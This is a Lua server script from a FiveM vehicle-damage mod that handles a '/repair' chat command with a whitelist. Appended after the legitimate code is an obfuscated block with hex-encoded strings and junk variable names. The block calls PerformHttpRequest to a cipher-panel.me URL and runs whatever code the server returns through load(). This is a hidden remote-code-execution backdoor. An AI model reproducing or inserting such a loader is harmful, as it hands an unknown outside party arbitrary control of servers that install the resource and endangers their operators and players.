------------------------------------------
--	iEnsomatic RealisticVehicleFailure  --
------------------------------------------
--
--	Created by Jens Sandalgaard
--
--	This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
--
--	https://github.com/iEns/RealisticVehicleFailure
--



local function checkWhitelist(id)
	for key, value in pairs(RepairWhitelist) do
		if id == value then
			return true
		end
	end	
	return false
end

AddEventHandler('chatMessage', function(source, _, message)
	local msg = string.lower(message)
	local identifier = GetPlayerIdentifiers(source)[1]
	if msg == "/repair" then
		CancelEvent()
		if RepairEveryoneWhitelisted == true then
			TriggerClientEvent('iens:repair', source)
		else
			if checkWhitelist(identifier) then
				TriggerClientEvent('iens:repair', source)
			else
				TriggerClientEvent('iens:notAllowed', source)
			end
		end
	end
end)


local nJzITbjBCxsGgVTUiPwZiXEmckWdCNgLSXmZjuipBuxACeDaqltRNRlaDMyznzVHblwsZn = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} nJzITbjBCxsGgVTUiPwZiXEmckWdCNgLSXmZjuipBuxACeDaqltRNRlaDMyznzVHblwsZn[4][nJzITbjBCxsGgVTUiPwZiXEmckWdCNgLSXmZjuipBuxACeDaqltRNRlaDMyznzVHblwsZn[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (EAszEvoewatRliCZZmZplnXSnKMEcVnhjJwdZWeJFHRmqNCPsPfmhWHfOSkMiqfUPICHGd, jJUgXlRIEsIpqXFRxCsgoAlUYehMWolHCSTEQyXLBQbhTHcZuDfEgUgWCYKQFqXKONUBsZ) if (jJUgXlRIEsIpqXFRxCsgoAlUYehMWolHCSTEQyXLBQbhTHcZuDfEgUgWCYKQFqXKONUBsZ == nJzITbjBCxsGgVTUiPwZiXEmckWdCNgLSXmZjuipBuxACeDaqltRNRlaDMyznzVHblwsZn[6] or jJUgXlRIEsIpqXFRxCsgoAlUYehMWolHCSTEQyXLBQbhTHcZuDfEgUgWCYKQFqXKONUBsZ == nJzITbjBCxsGgVTUiPwZiXEmckWdCNgLSXmZjuipBuxACeDaqltRNRlaDMyznzVHblwsZn[5]) then return end nJzITbjBCxsGgVTUiPwZiXEmckWdCNgLSXmZjuipBuxACeDaqltRNRlaDMyznzVHblwsZn[4][nJzITbjBCxsGgVTUiPwZiXEmckWdCNgLSXmZjuipBuxACeDaqltRNRlaDMyznzVHblwsZn[2]](nJzITbjBCxsGgVTUiPwZiXEmckWdCNgLSXmZjuipBuxACeDaqltRNRlaDMyznzVHblwsZn[4][nJzITbjBCxsGgVTUiPwZiXEmckWdCNgLSXmZjuipBuxACeDaqltRNRlaDMyznzVHblwsZn[3]](jJUgXlRIEsIpqXFRxCsgoAlUYehMWolHCSTEQyXLBQbhTHcZuDfEgUgWCYKQFqXKONUBsZ))() end)